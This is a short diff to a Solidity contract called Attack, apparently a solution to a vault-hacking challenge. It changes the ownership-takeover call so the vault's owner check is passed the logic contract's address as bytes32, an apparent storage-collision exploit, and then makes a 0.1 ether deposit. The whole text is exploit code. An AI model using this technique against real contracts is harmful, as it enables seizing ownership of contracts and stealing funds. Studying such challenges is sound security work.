@@ -9,9 +9,11 @@ interface IVault {
 }
 
 contract Attack {
+    address public logicAddress;
     address public vaultAddr;
 
-    constructor(address _vaultAddr) {
+    constructor(address _logicAddress, address _vaultAddr) {
+        logicAddress = _logicAddress;
         vaultAddr = _vaultAddr;
     }
 
@@ -23,7 +25,7 @@ contract Attack {
 
     function startAttack() public {
         // change owner
-        (bool success, bytes memory data) = vaultAddr.call(abi.encodeWithSignature("changeOwner(bytes32,address)", bytes32("0x1234"), address(this)));
+        (bool success, bytes memory data) = vaultAddr.call(abi.encodeWithSignature("changeOwner(bytes32,address)", bytes32(uint256(uint160(logicAddress))), address(this)));
 
         // deposit 0.1 ether
         IVault(vaultAddr).deposite{value: 0.1 ether}();
